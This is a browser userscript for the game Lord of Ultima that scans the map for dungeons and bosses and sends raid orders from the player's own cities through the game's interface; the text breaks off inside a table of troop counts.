// ==UserScript==
// @name           LouWatcher
// @description    
// @namespace      hotwirring
// @include        http://prodgame29.lordofultima.com/229/index.aspx*
// @version        3.2
// @grant          GM_log
// ==/UserScript==

(function() {
    var LouWatcher = function() {
        function createSuite() {
            var louSuite = {};
            var LT = {};

            qx.Class.define("louSuite.main", {
                type: "singleton",
                extend: qx.core.Object,
                members: {
                    _player: null,
                    app: null,
                    srvBar: null,
                    bosses: null,
                    dungeons: null,
                    city: null,
                    cities: null,
                    cityId: null,
                    boss_raider: null,
                    dungeon_raider: null,
                    LS_RAID: 8,
                    LS_RAID_REPEAT: 1,
                    LS_RAID_ONCE: 0,
                    options: null,
                    optionsPage: null,
                    initialize: function () {
                        this.app = qx.core.Init.getApplication();
                        this.cities = {};
                        this.bosses = {};
                        this.dungeons = {};

                        for (var cityId in webfrontend.data.Player.getInstance().cities) {
                            var c = webfrontend.data.Player.getInstance().cities[cityId];

                            var cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
                            this.bosses['c' + cont] = {};
                            this.dungeons['c' + cont] = {};
                        }

                        this._player = webfrontend.data.Player.getInstance().getId();

                        this.srvBar = this.app.serverBar;

                        this.startScript();
                    },
                    startScript: function () {
                        _LT = LT;
                        this.loadOptions();
                        LT.options = this.options;
                        LT.a = this.app;
                        LT.main = this;
                        LT.player = webfrontend.data.Player.getInstance();
                        this.scanAllCities();

                        // ***** Options button ***** //
                        btn = new qx.ui.form.Button("S");
                        btn.set({
                            width: 30,
                            appearance: "button-text-small",
                            toolTipText: "LoU Suite Settings"
                        });
                        btn.addListener("click", this.showOptionsPage, this);
                        this.srvBar.add(btn, {
                            top: 2,
                            left: 350
                        });

                        // ***** Listeners ***** //
                        this.optionsPage = new window.louSuite.optionsPage();
                    },
                    sendTroops: function (order_type, city_id, x, y, units, repeat, callbackFunc) {
                        var updateManager = webfrontend.net.UpdateManager.getInstance();
                        var data = {
                            session: updateManager.getInstanceGuid(),
                            cityid: city_id,
                            units: units,
                            targetPlayer: "",
                            targetCity: x + ':' + y,
                            order: order_type,
                            transport: 1,
                            createCity: "",
                            timeReferenceType: 1,
                            referenceTimeUTCMillis: 0,
                            raidTimeReferenceType: repeat, // Repeat raid or not
                            raidReferenceTimeUTCMillis: 0,
                            iUnitOrderOptions: 0,
                        };

                        var req = new qx.io.remote.Request(updateManager.getUpdateService() + "/Service.svc/ajaxEndpoint/OrderUnits", "POST", "application/json");
                        req.setProhibitCaching(false);
                        req.setRequestHeader("Content-Type", "application/json");
                        req.setData(qx.lang.Json.stringify(data));
                        req.setTimeout(10000);
                        req.addListener("completed", function (e) {
                            callbackFunc(e, {
                                cid: city_id,
                                x: x,
                                y: y,
                                units: units
                            });
                        }, this);
                        req.send();
                    },
                    moveToContRegion: function (cont, q) {
                        var c = 0;
                        for (var x = 1; x < 4; x++) {
                            for (var y = 1; y < 4; y++) {
                                c += 1;
                                if (c == q) {
                                    var xm = x / 4;
                                    var ym = y / 4;
                                    var col = Math.floor(cont % 10);
                                    var row = Math.floor(cont / 10);
                                    var srv = webfrontend.data.Server.getInstance();
                                    var height = srv.getContinentHeight();
                                    var width = srv.getContinentWidth();
                                    var x = Math.floor(col * width + 0.5 * width);
                                    var y = Math.floor(row * height + 0.5 * height);

                                    LT.a.setMainView('r', 0, x * LT.a.visMain.getTileWidth(), y * LT.a.visMain.getTileHeight());
                                }
                            }
                        }
                    },
                    scanRegion: function () {
                        if (LT.a.visMain.mapmode == "r") {
                            p = webfrontend.data.Player.getInstance().getName();

                            clib = ClientLib.Vis.VisMain.GetInstance();
                            region_object = clib.get_Region();
                            if (region_object == null || region_object == undefined) return;
                            for (var o in region_object) {
                                if (region_object[o] != null && region_object[o].hasOwnProperty("d")) data_object = region_object[o];
                            }
                            if (data_object == null || data_object == undefined) return;
                            d_object = data_object.d;
                            if (d_object == null || d_object == undefined) return;
                            for (var n in d_object) {
                                data_table = null;
                                // this is just way too much, but couldn't find better solution to get obfuscated and version changing variables
                                try {
                                    for (var dob in d_object[n]) {
                                        if (d_object[n][dob] instanceof Array && d_object[n][dob].length == 32) {
                                            for (e = 0; e < d_object[n][dob].length; e++) {
                                                r = d_object[n][dob][e];
                                                if (r == null && typeof r == "object") {
                                                    data_table = d_object[n][dob];
                                                    break;
                                                } else {
                                                    for (f = 0; f < r.length; f++) {
                                                        if (r[f] == null && typeof r[f] == "object") {
                                                            data_table = d_object[n][dob];
                                                            break;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        if (data_table != null) break;
                                    }
                                } catch (e) {

                                }
                                //data_table = d_object[n].SIB;
                                if (data_table == null || data_table == undefined) continue;
                                for (q = 0; q < data_table.length; q++) {
                                    row = data_table[q];
                                    for (w = 0; w < row.length; w++) {
                                        if (row[w] != null) {
                                            crd = row[w].get_Coordinates();
                                            posX = crd & 0xFFFF;
                                            posY = crd >> 16;
                                            uit = row[w].get_UIType();
                                            //console.log("(" + posX + ":" + posY +"), " + uit);
                                            // uit - City / LawlessCity / Shrine / Dungeon / Boss / FreeSlot / null (moongate)
                                            if (uit == "Boss") {
                                                // Determine what kind of boss we have, and what level
                                                var b_type = null;
                                                var b_level = null;
                                                for (var fg in row[w]) {
                                                    if (row[w][fg] != null && row[w][fg].hasOwnProperty("BossLevel")) {
                                                        b_type = row[w][fg]['BossType'];
                                                        b_level = row[w][fg]['BossLevel'];
                                                        b_state = row[w][fg]['State'];
                                                    }
                                                }
                                                switch (b_type) {
                                                    case 6:
                                                        b_name = "Dragon";
                                                        break;
                                                    case 7:
                                                        b_name = "Moloch";
                                                        break;
                                                    case 8:
                                                        b_name = "Hydra";
                                                        break;
                                                    case 5:
                                                        b_name = "Octopus";
                                                        break;
                                                    default:
                                                        b_name = "Boss";
                                                        break;
                                                }
                                                //console.log("(" + posX + ":" + posY + ") - " + b_name + " Level " + b_level + " State: " + b_state);
                                                //console.log(row[w]);
                                                var cont = webfrontend.data.Server.getInstance().getContinentFromCoords(posX, posY);
                                                try {
                                                    this.bosses['c' + cont][posX + "-" + posY] = {
                                                        'type': b_name,
                                                        'level': b_level,
                                                        'x': posX,
                                                        'y': posY,
                                                        'state': b_state,
                                                        't': b_type
                                                    };
                                                } catch (e) {
                                                    // The boss was from a different continent. Oh well
                                                }
                                            }
                                            if (uit == "Dungeon") {
                                                // Determine what kind of dungeon we have, and what level
                                                var d_type = null;
                                                var d_level = null;
                                                var d_state = null;
                                                var d_progress = null;
                                                for (var fg in row[w]) {
                                                    if (row[w][fg] != null && row[w][fg].hasOwnProperty("DungeonLevel")) {
                                                        d_type = row[w][fg]['DungeonType'];
                                                        d_level = row[w][fg]['DungeonLevel'];
                                                        d_state = row[w][fg]['State'];
                                                        d_progress = row[w][fg]['Progress'];
                                                    }
                                                }
                                                switch (d_type) {
                                                    case 4:
                                                        d_name = "Mountain";
                                                        break;
                                                    case 3:
                                                        d_name = "Hill";
                                                        break;
                                                    case 5:
                                                        d_name = "Forest";
                                                        break;
                                                    default:
                                                        d_name = "Unknown Dungeon";
                                                        break;
                                                }
                                                var cont = webfrontend.data.Server.getInstance().getContinentFromCoords(posX, posY);
                                                try {
                                                    this.dungeons['c' + cont][posX + "-" + posY] = {
                                                        'type': d_name,
                                                        'level': d_level,
                                                        'x': posX,
                                                        'y': posY,
                                                        'progress': d_progress,
                                                        'state': d_state,
                                                        't': d_type
                                                    };
                                                } catch (e) {

                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    },
                    scanAllCities: function () {
                        var server = bos.Server.getInstance();
                        for (var cid in LT.player.cities) {
                            var city = server.cities[cid];
                            this.cities[cid] = city;
                        }
                    },
                    pollCities: function (citiesToPoll, selectedContinent, options) {
						if (!options) options = {};
						
						this.moveToContRegion(selectedContinent, 4);
						
						var server = new bos.Server();
						server.pollCities(citiesToPoll);
						
						if (options.silent) {
							server._pollCitiesProgressDialog.disable();
						}
						
						window.setTimeout(function () {
							window.louSuite.main.getInstance().scanAllCities();
							if (options.scanRegion) {
								window.louSuite.main.getInstance().scanRegion();
							}
							window.louSuite.main.getInstance().dungeon_raider.updateView();
							window.louSuite.main.getInstance().boss_raider.updateView();
						}, citiesToPoll.length*500+2000);
                    },
                    getCityUnits: function (id) {
                        var city = this.cities[id];
                        //var c_info = LT.player.cities[id];
                        //c_name = c_info['name'];
                        var units = {};
                        if (city != null) {
                            for (var uid in city['units']) {
                                u_name = this.getUnitName(uid);
                                u_count = city['units'][uid]['count'];
                                u_speed = city['units'][uid]['speed'];
                                u_total = city['units'][uid]['total'];
                                //console.log(c_name + " : " + u_count + "/" + u_total + " " + u_name + " available.");
                                units[uid] = {
                                    count: u_count,
                                    name: u_name,
                                    total: u_total
                                };
                            }
                        }

                        return units;
                    },
                    getUnitName: function (id) {
                        switch (id) {
                            case '1':
                                return "City Guard";
                            case '2':
                                return "Ballista";
                            case '3':
                                return "Ranger";
                            case '4':
                                return "Guardian";
                            case '5':
                                return "Templar";
                            case '6':
                                return "Berserker";
                            case '7':
                                return "Mage";
                            case '8':
                                return "Scout";
                            case '9':
                                return "Crossbow";
                            case '10':
                                return "Paladin";
                            case '11':
                                return "Knight";
                            case '12':
                                return "Warlock";
                            case '13':
                                return "Ram";
                            case '14':
                                return "Catapult";
                            case '15':
                                return "Frigate";
                            case '16':
                                return "Sloop";
                            case '17':
                                return "Galleon";
                            case '19':
                                return "Baron";
                            default:
                                return id;
                        }
                    },
                    setMessage: function (message) {
                        var dialog = new webfrontend.gui.ConfirmationWidget();
                        dialog.showGenericNotice("Error", message, message, "webfrontend/ui/bgr_popup_survey.gif");

                        qx.core.Init.getApplication().getDesktop().add(dialog, {
                            left: 0,
                            right: 0,
                            top: 0,
                            bottom: 0
                        });
                        dialog.show();
                    },
                    showOptionsPage: function () {
                        this.app.switchOverlay(this.optionsPage);
                    },
                    loadOptions: function () {
                        forceSave = false;
                        _str = localStorage.getItem("LT_options");
                        if (_str) this.options = qx.lang.Json.parse(_str);
                        else {
                            this.options = {
                                "lowestLevelMax": [10, 10, 10, 10, 10, 10]
                            };
                        }

                        this.app.setUserData("LT_options", this.options);
                        if (forceSave) {
                            str = qx.lang.Json.stringify(this.options);
                            localStorage.setItem("LT_options", str);
                        }
                    }
                }
            });
			
            qx.Class.define("louSuite.optionsPage", {
                extend: webfrontend.gui.OverlayWidget,
                construct: function () {
                    webfrontend.gui.OverlayWidget.call(this);
                    this.clientArea.setLayout(new qx.ui.layout.Canvas());
                    this.setTitle("LoU Suite | 76s Edit");
                    this.tabView = new qx.ui.tabview.TabView().set({
                        contentPaddingLeft: 15,
                        contentPaddingRight: 10,
                        contentPaddingTop: 10,
                        contentPaddingBottom: 10
                    });
                    this.tabView.add(new lou_suite.gui.DungeonRaider());
                    this.tabView.add(new lou_suite.gui.BossRaider());

                    this.clientArea.add(this.tabView, {
                        top: 0,
                        right: 3,
                        bottom: 30,
                        left: 3
                    });
                },
                members: {
                    tabView: null,
                    tabPages: null,
                    clrSel: null,
                    saveOptions: function () {
                        str = qx.lang.Json.stringify(LT.options);
                        localStorage.setItem("LT_options", str);
                        LT.a.switchOverlay(null);
                    },
                }
            });
			
            qx.Class.define("lou_suite.gui.DungeonRaider", {
                extend: bos.gui.SummaryPage,
                construct: function () {
                    var lou_suite = window.louSuite.main.getInstance();
                    lou_suite.dungeon_raider = this;
                    bos.gui.SummaryPage.call(this);
                    this.setLabel("Dungeon Raider");
                    this.setLayout(new qx.ui.layout.VBox(10));
                    this.add(this._createToolBar());
                    this._tableModel = new qx.ui.table.model.Simple();
                    var columnNames = ["Id", "Row Info", "Type", "Level", "Pos", "Progress", "Name", "Distance", "Units (click to send)"];
                    var columnIds = ["id", "row_info", "dungeon_type", "dungeon_level", "position", "dungeon_progress", "name", "distance", "units"];

                    this._tableModel.setColumns(columnNames, columnIds);

                    this._setupSorting(this._tableModel);
                    this._tableModel.sortByColumn(7, true);

                    var custom = {
                        tableColumnModel: function (obj) {
                            return new qx.ui.table.columnmodel.Resize(obj);
                        }
                    };

                    this.table = new bos.ui.table.Table(this._tableModel, custom);
                    this.table.addListener("cellClick", this._handleCellClick, this);

                    var columnModel = this.table.getTableColumnModel();

                    columnModel.setColumnVisible(0, false);
                    columnModel.setColumnVisible(1, false);
                    columnModel.setDataCellRenderer(4, new bos.ui.table.cellrenderer.ClickableLook());
                    columnModel.setDataCellRenderer(6, new bos.ui.table.cellrenderer.ClickableLook());
                    columnModel.setDataCellRenderer(8, new bos.ui.table.cellrenderer.ClickableLook());

                    var tcm = this.table.getTableColumnModel();
                    var resizeBehavior = tcm.getBehavior();
                    resizeBehavior.setWidth(2, 60);
                    resizeBehavior.setWidth(3, 20);
                    resizeBehavior.setWidth(4, 50);
                    resizeBehavior.setWidth(5, 30);
                    resizeBehavior.setWidth(6, 70);
                    resizeBehavior.setWidth(7, 50);
                    resizeBehavior.setWidth(8, "1*");
                    resizeBehavior.setMinWidth(8, 100);

                    this.add(this.table, {
                        flex: 1
                    });
                },
                members: {
                    sbContinents: null,
                    btnUpdateView: null,
                    sbLevel: null,
                    classicView: function () {
                        var rowData = [];
                        var lou_suite = window.louSuite.main.getInstance();
                        var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                        var min_level = this.sbLevel.getSelection()[0].getModel();

                        // Refresh the city list to get new troop counts
                        lou_suite.scanAllCities();

                        // First get all the dungeons in the area for the continent we are working with
                        var dungeons = lou_suite.dungeons;
                        for (var d_key in dungeons['c' + selectedContinent]) {
                            var dungeon = dungeons['c' + selectedContinent][d_key];
                            if (dungeon['state'] && (dungeon['level'] >= min_level)) {
                                // Then get all the cities on that continent that can hit it
                                for (var cityId in LT.player.cities) {
                                    c = LT.player.cities[cityId];

                                    if (c == null) {
                                        continue;
                                    }

                                    var city_cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
                                    // Check that the city is on the right continent
                                    if (city_cont != selectedContinent) {
                                        continue;
                                    }

                                    var city = lou_suite.cities[cityId];
                                    if (city == undefined) {
                                        continue;
                                    }

                                    // Check that the city has enough troops
                                    if (city.getUnitCount() == 0) {
                                        continue;
                                    }

                                    // Check that there are enough units to send for this dungeon
                                    var units = lou_suite.getCityUnits(cityId);
                                    var unitsCapacity = this.getUnitsCapacity(units);
                                    var capacityNeeded = this.getCapacityNeeded(dungeon['type'], dungeon['level'], dungeon['progress']);
                                    var commandsMax = city.$$user_orderLimit
									var commandsFree = commandsMax - (city.getUnitOrders() || []).length;
									var amountOfCommandsNeededToOccupyAllTroops = unitsCapacity.total / capacityNeeded;
									
									//if we dont have enough troops
                                    if (capacityNeeded > unitsCapacity.count) {
                                        continue;
                                    }
									
									//if this dungeon wont get our current troops busy
                                    if (capacityNeeded * commandsFree < unitsCapacity.count) {
										//and it wont get the city busy even if it had no commands sent
										if ( amountOfCommandsNeededToOccupyAllTroops > commandsMax ) {
											continue;
										}
                                    }
									
									//if this wont even get half our total troops busy
                                    if ( amountOfCommandsNeededToOccupyAllTroops > commandsMax * 2 ) {
                                        continue;
                                    }

                                    var units_to_send = this.getTroopsNeeded(capacityNeeded, unitsCapacity.count, units, dungeon['type']);

                                    if (typeof (units_to_send) == 'object') {
                                        var row = [];

                                        var units_string = "";
                                        for (var u_key in units_to_send) {
                                            units_string = units_string + " " + units_to_send[u_key] + " " + units[u_key]['name'];
                                        }

                                        this._addBlankValuesToRow(row, this._tableModel);
                                        row["units"] = units_string;
                                        row["id"] = cityId;
                                        row["row_info"] = {
                                            units: units_to_send,
                                            dungeon: dungeon,
                                            city: c
                                        };
                                        row["name"] = c.name;
                                        var diffX = Math.abs(c.xPos - dungeon['x']);
                                        var diffY = Math.abs(c.yPos - dungeon['y']);
                                        row["distance"] = Math.sqrt(diffX * diffX + diffY * diffY);
                                        row["position"] = dungeon['x'] + ":" + dungeon['y'];
                                        row["dungeon_type"] = dungeon['type'];
                                        row["dungeon_level"] = dungeon['level'];
                                        row["dungeon_progress"] = dungeon['progress'];

                                        rowData.push(row);
                                    }
                                }
                            }
                        }

                        return rowData;
                    },
                    createRowData: function () {
                        return this.classicView();
                    },
                    getUnitsCapacity: function (units) {
                        var capacity = {
							count: 0,
							total: 0
						};
                        for (i in units) {
                            if (i == 7) {
                                capacity.count += units[i].count * 5;
								capacity.total += units[i].total * 5;
                            } else if (i == 3 || i == 5 || i == 6 || i == 12) {
                                capacity.count += units[i].count * 10;
								capacity.total += units[i].total * 10;
                            } else if (i == 11 || i == 9) {
                                capacity.count += units[i].count * 15;
								capacity.total += units[i].total * 15;
                            } else if (i == 4 || i == 10) {
                                capacity.count += units[i].count * 20;
								capacity.total += units[i].total * 20;
                            }
							/*
							else if (i == 15) {
								capacity += units[i].count*1000;
							} else if (i == 16) {
								capacity += units[i].count*1500;
							} else if (i == 17) {
								capacity += units[i].count*3000;
							}
							*/
                        }
                        return capacity;
                    },
                    getCapacityNeeded: function (dungeon_name, dungeon_level, dungeon_progress) {
                        const dungeonKill = [320, 1000, 2000, 15000, 30000, 56850, 117280, 198210, 360000, 441380];

                        var multiplier = (1.00 + dungeon_progress / 50.00);
                        var mRec = multiplier + (3 - multiplier) / 4;

                        return Math.round(dungeonKill[parseInt(dungeon_level) - 1] * mRec);
                    },
                    getTroopsNeeded: function (capacityNeeded, totalCapacity, units, dungeon_name) {
                        if (totalCapacity < capacityNeeded) return false;

                        var multiplier = capacityNeeded / totalCapacity;
                        var queued_units = {};
                        for (var u_key in units) {
                            var unit = units[u_key];
                            if (unit['count'] > 0 && u_key != 8 && u_key != 19) {
                                if (dungeon_name == 'Mountain' && (u_key == 9 || u_key == 10 || u_key == 11 || u_key == 7)) {
                                    return false;
                                }
                                if (dungeon_name == 'Hill' && (u_key == 9 || u_key == 10 || u_key == 11 || u_key == 3 || u_key == 4 || u_key == 5 || u_key == 6)) {
                                    return false;
                                }
                                if (dungeon_name == 'Forest' && (u_key == 7 || u_key == 3 || u_key == 4 || u_key == 5 || u_key == 6)) {
                                    return false;
                                }

                                queued_units[parseInt(u_key)] = Math.ceil(unit['count'] * multiplier);
                            }
                        }

                        return queued_units;
                    },
                    _shouldBeIncluded: function (city) {
                        return true;
                    },
                    _handleCellClick: function (event) {
                        var row = event.getRow();
                        var column = event.getColumn();
                        var rowData = this._tableModel.getRowDataAsMap(row);
                        var cityId = rowData["id"];
                        var row_info = rowData["row_info"];
                        var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                        switch (column) {
                            case 4:
                                var dungeon = row_info['dungeon'];
                                LT.a.setMainView('r', 0, dungeon['x'] * LT.a.visMain.getTileWidth(), dungeon['y'] * LT.a.visMain.getTileHeight());
                                break;
                            case 6:
                                LT.a.setMainView("c", cityId, -1, -1);
                                break;
                            case 8:
                                // Send the proper units from the correct city to the correct boss
                                var lou_suite = window.louSuite.main.getInstance();
                                var dungeon = row_info['dungeon'];
                                var city = row_info['city'];
                                var units = row_info['units'];
                                var units_to_send = [];

                                for (var u_key in units) {
                                    units_to_send.push({
                                        t: u_key,
                                        c: units[u_key]
                                    });
                                }

                                this._tableModel.setValue(column, row, "");
                                lou_suite.sendTroops(lou_suite.LS_RAID, cityId, dungeon['x'], dungeon['y'], units_to_send, lou_suite.LS_RAID_REPEAT, this.onTroopsSent);
                                break;
                        }
                    },
                    onTroopsSent: function (event, v) {
                        if (event.getContent() == null) {
                            console.log('invalid');
                            return;
                        }
						
						var lou_suite = window.louSuite.main.getInstance();
						var selectedContinent = lou_suite.dungeon_raider.sbContinents.getSelection()[0].getModel();
						
                        var code = event.getContent().r0;
                        //console.log("Code Received: " + code);
						
                        switch (code) {
                            case 0:
                                // Success
								
								//client prediction
								var units_sent = v['units'];
								for (var u_key in units_sent) {
									var unit = units_sent[u_key];
									var total = lou_suite.cities[v['cid']]['units'][unit['t']]['count'];
									total = total - unit['c'];
									lou_suite.cities[v['cid']]['units'][unit['t']]['count'] = total;
								}
								lou_suite.cities[v['cid']]['unitOrders'].push({});
								
								this.moveToContRegion(selectedContinent, 4);
								lou_suite.dungeon_raider.updateView();
								
								//get real data
                                lou_suite.pollCities([v['cid']], selectedContinent, {silent: true});
								
                                break;
                            case 4: //message = "Not enough units. Try rescanning the city.";
							case 64: //message = "No more command slots. Use a different city.";
								
								lou_suite.setMessage("Not enough units or command slots " + code);
								
								lou_suite.pollCities([v['cid']], selectedContinent);
								
                                break;
                            default:
								
								lou_suite.setMessage("Unknown Error: " + code);
								
								var citiesIds = [];
								// Limit by selected continent
								for (var cityId in LT.player.cities) {
									c = LT.player.cities[cityId];
									if (c == null) {
										continue;
									}
									var city_cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
									// Check that the city is on the right continent
									if (city_cont != selectedContinent) {
										continue;
									}
									citiesIds.push(cityId);
								}
								lou_suite.pollCities(citiesIds, selectedContinent, {scanRegion: true});
								
                                break;
                        }

                        // Failed
                        console.log("Failed with status code ", code);

                        // Update the view
                        lou_suite.dungeon_raider.updateView();
                    },
                    createCitiesContinentsSelectBox: function () {
                        var sb = new qx.ui.form.SelectBox().set({
                            width: 60,
                            height: 28
                        });
                        var cities = webfrontend.data.Player.getInstance().cities;

                        sb.setToolTipText("Filter by: <b>continents</b>");

                        var continents = [];
                        for (var cityId in cities) {
                            var city = cities[cityId];
                            var cont = webfrontend.data.Server.getInstance().getContinentFromCoords(city.xPos, city.yPos);
                            continents["c" + cont] = true;
                        }

                        var list = [];
                        for (var key in continents) {
                            if (key.substring != undefined && qx.lang.Type.isString(key)) {
                                var cont = parseInt(key.substring(1), 10);
                                if (!isNaN(cont)) {
                                    list.push(cont);
                                }
                            }
                        }

                        list.sort();

                        for (var i = 0; i < list.length; i++) {
                            var cont = list[i];
                            sb.add(new qx.ui.form.ListItem("C" + cont, null, cont));
                        }

                        return sb;
                    },
                    _createToolBar: function () {
                        // TODO - Add a selector for repeat or non-repeat
                        var toolBar = new qx.ui.groupbox.GroupBox();
                        toolBar.setLayout(new qx.ui.layout.Flow(10, 10));

                        this.sbContinents = this.createCitiesContinentsSelectBox();
                        this.sbContinents.addListener("changeSelection", function (evt) {
                            this.updateView();
                        }, this);
                        toolBar.add(this.sbContinents);

                        this.sbLevel = new qx.ui.form.SelectBox().set({
                            width: 70,
                            height: 28
                        });

                        this.sbLevel.setToolTipText("Filter by: <b>min level</b>");

                        var min_level = localStorage.getItem("lou_suite_min_level");

                        if (typeof min_level == 'undefined') {
                            min_level = 1;
                        }

                        var levels_list = [1, 2, 3, 4, 5, 6, 7, 8, 9];

                        for (var i = 1; i < 10; i++) {
                            var item = new qx.ui.form.ListItem("Level " + i, null, i);
                            this.sbLevel.add(item);
                            if (i == min_level) {
                                this.sbLevel.setSelection([item]);
                            }
                        }

                        this.sbLevel.addListener("changeSelection", function (evt) {
                            localStorage.setItem("lou_suite_min_level", this.sbLevel.getSelection()[0].getModel());
                            this.updateView();
                        }, this);
                        toolBar.add(this.sbLevel);

                        this.btnUpdateView = new qx.ui.form.Button("Scan");
                        this.btnUpdateView.setWidth(80);
                        toolBar.add(this.btnUpdateView);
                        this.btnUpdateView.addListener("execute", function (evt) {
                            var citiesIds = [];

                            var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                            // Limit by selected continent
                            for (var cityId in LT.player.cities) {
                                c = LT.player.cities[cityId];

                                if (c == null) {
                                    continue;
                                }

                                var city_cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
                                // Check that the city is on the right continent
                                if (city_cont != selectedContinent) {
                                    continue;
                                }
                                citiesIds.push(cityId);
                            }
							
                            window.louSuite.main.getInstance().pollCities(citiesIds, this.sbContinents.getSelection()[0].getModel(), {scanRegion: true});
                        }, this);

                        return toolBar;
                    }
                }
            });
			
            qx.Class.define("lou_suite.gui.BossRaider", {
                extend: bos.gui.SummaryPage,
                construct: function () {
                    var lou_suite = window.louSuite.main.getInstance();
                    lou_suite.boss_raider = this;
                    bos.gui.SummaryPage.call(this);
                    this.setLabel("Boss Raider");
                    this.setLayout(new qx.ui.layout.VBox(10));
                    this.add(this._createToolBar());
                    this._tableModel = new qx.ui.table.model.Simple();
                    var columnNames = ["Id", "Row Info", "Type", "Level", "Pos", "Name", "Distance", "Units", "Actions"];
                    var columnIds = ["id", "row_info", "boss_type", "boss_level", "position", "name", "distance", "units", "actions"];

                    this._tableModel.setColumns(columnNames, columnIds);

                    this._setupSorting(this._tableModel);
                    this._tableModel.sortByColumn(6, true);

                    var custom = {
                        tableColumnModel: function (obj) {
                            return new qx.ui.table.columnmodel.Resize(obj);
                        }
                    };

                    this.table = new bos.ui.table.Table(this._tableModel, custom);
                    this.table.addListener("cellClick", this._handleCellClick, this);

                    var columnModel = this.table.getTableColumnModel();

                    columnModel.setColumnVisible(0, false);
                    columnModel.setColumnVisible(1, false);
                    columnModel.setDataCellRenderer(4, new bos.ui.table.cellrenderer.ClickableLook());
                    columnModel.setDataCellRenderer(5, new bos.ui.table.cellrenderer.ClickableLook());
                    columnModel.setDataCellRenderer(8, new bos.ui.table.cellrenderer.ClickableLook());

                    var tcm = this.table.getTableColumnModel();
                    var resizeBehavior = tcm.getBehavior();
                    resizeBehavior.setWidth(2, 60);
                    resizeBehavior.setWidth(3, 20);
                    resizeBehavior.setWidth(4, 50);
                    resizeBehavior.setWidth(5, 100);
                    resizeBehavior.setWidth(6, 70);
                    resizeBehavior.setWidth(7, 80);
                    resizeBehavior.setWidth(8, "1*");
                    resizeBehavior.setMinWidth(8, 100);

                    this.add(this.table, {
                        flex: 1
                    });
                },
                members: {
                    sbContinents: null,
                    btnUpdateView: null,
                    sbLevel: null,
                    classicView: function () {
                        var rowData = [];
                        var lou_suite = window.louSuite.main.getInstance();
                        var selectedContinent = this.sbContinents.getSelection()[0].getModel();
                        var min_level = this.sbLevel.getSelection()[0].getModel();

                        // Refresh the city list to get new troop counts
                        lou_suite.scanAllCities();

                        // First get all the bosses in the area for the continent we are working with
                        var bosses = lou_suite.bosses;
                        for (var b_key in bosses['c' + selectedContinent]) {
                            var boss = bosses['c' + selectedContinent][b_key];
                            if (boss['state'] && (boss['level'] >= min_level)) {
                                // Then get all the cities on that continent that can hit that boss
                                // Show the distance for the city to hit the boss

                                for (var cityId in LT.player.cities) {
                                    c = LT.player.cities[cityId];

                                    if (c == null) {
                                        continue;
                                    }

                                    var city_cont = webfrontend.data.Server.getInstance().getContinentFromCoords(c.xPos, c.yPos);
                                    // Check that the city is on the right continent
                                    if (city_cont != selectedContinent) {
                                        continue;
                                    }

                                    var city = lou_suite.cities[cityId];
                                    if (city == undefined) {
                                        continue;
                                    }

                                    // Check that the city has enough troops to hit the boss
                                    if (city.getUnitCount() == 0) {
                                        continue;
                                    }

                                    var units = lou_suite.getCityUnits(cityId);
                                    // Check that there are enough units to send for this boss
                                    var units_to_send = this.getTroopsNeeded(boss['type'], boss['level'], units);
                                    if (typeof (units_to_send) == 'object') {
                                        var row = [];

                                        var units_string = "";
                                        for (var u_key in units_to_send) {
                                            units_string = units_string + " " + units_to_send[u_key] + " " + units[u_key]['name'];
                                        }

                                        this._addBlankValuesToRow(row, this._tableModel);
                                        row["units"] = units_string;
                                        row["id"] = cityId;
                                        row["row_info"] = {
                                            units: units_to_send,
                                            boss: boss,
                                            city: c
                                        };
                                        row["name"] = c.name;
                                        var diffX = Math.abs(c.xPos - boss['x']);
                                        var diffY = Math.abs(c.yPos - boss['y']);
                                        row["distance"] = Math.sqrt(diffX * diffX + diffY * diffY);
                                        row["position"] = boss['x'] + ":" + boss['y'];
                                        row["boss_type"] = boss['type'];
                                        row["boss_level"] = boss['level'];
                                        row["actions"] = "Send";

                                        rowData.push(row);
                                    }
                                }
                            }
                        }

                        return rowData;
                    },
                    createRowData: function () {
                        return this.classicView();
                    },
                    getUnitsPerBoss: function () {
                        var units = {
                            Dragon: {
                                6: [50, 300, 2000, 4000, 10000, 15000, 20000, 30000, 45000, 60000], // Berserker
                                3: [84, 500, 3334, 6667, 16667, 25000, 33334, 50000, 75000, 100000], // Ranger
                                5: [100, 600, 4000, 8000, 20000, 30000, 40000, 60000, 90000, 120000], // Templar
                                9: [42, 250, 1700, 3300, 8300, 12500, 17000, 25000, 37500, 50000], // Crossbowmen
                                11: [19, 112, 756, 1467, 3689, 5556, 7556, 11112, 16667, 22223], // Knight
                                7: [36, 215, 1429, 2858, 7143, 10715, 14286, 21429, 32143, 42858], // Mage
                                12: [21, 125, 834, 1667, 4167, 6250, 8334, 12500, 18750, 250000], // Warlock
                                10: [28, 167, 1134, 2200, 5534, 8334, 11334, 16667, 25000, 33334], // Paladin
                            },
                            Moloch: {
                                6: [50, 300, 2000, 4000, 10000, 15000, 20000, 30000, 45000, 60000], // Berserker
                                3: [84, 500, 3334, 6667, 16667, 25000, 33334, 50000, 75000, 100000], // Ranger
                                5: [100, 600, 4000, 8000, 20000, 30000, 40000, 60000, 90000, 120000], // Templar
                                9: [63, 375, 2500, 5000, 12500, 18750, 25000, 37500, 56250, 75000], // Crossbowmen
                                11: [28, 167, 1112, 2223, 5556, 8334, 11112, 16667, 25000, 33334], // Knight
                                7: [24, 143, 972, 1886, 4743, 7143, 9715, 14286, 21429, 28572], // Mage
                                12: [14, 84, 567, 1100, 2767, 4167, 5667, 8664, 12500, 16667], // Warlock
                                10: [42, 250, 1667, 3334, 8334, 12500, 16667, 25000, 37500, 50000], // Paladin
                            },
                            Hydra: {
                                6: [34, 200, 1360, 2640, 6640, 10000, 13600, 20000, 30000, 40000], // Berserker
                                3: [56, 334, 2267, 4400, 11067, 16667, 22667, 33334, 50000, 66667], // Ranger
                                5: [68, 400, 2720, 5280, 13280, 20000, 27200, 40000, 60000, 80000], // Templar
                                9: [63, 375, 2500, 5000, 12500, 18750, 25000, 37500, 56250, 75000], // Crossbowmen
